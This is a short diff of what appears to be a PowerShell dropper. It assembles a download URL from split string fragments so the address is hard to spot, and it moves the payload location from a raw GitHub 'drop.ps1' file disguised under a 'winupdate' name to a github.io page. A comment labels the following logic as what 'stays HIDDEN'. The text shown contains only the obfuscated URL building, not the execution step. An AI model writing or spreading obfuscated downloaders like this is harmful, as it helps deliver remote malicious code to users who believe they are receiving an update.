@@ -1,5 +1,5 @@
 $k = 1869;
-$p1 = 'h' + 'tt' + 'ps://'; $p2 = 'raw.git' + 'hubuser'; $p3 = 'content.com/gwyn1869/winupdate/main/drop.ps1'
+$p1 = 'h' + 'tt' + 'ps://'; $p2 = 'gwyn18' + '69.gith'; $p3 = 'ub.io/winupdate/drop'
 $url = "$p1$p2$p3"
 
 # 1. This is the logic that stays HIDDEN
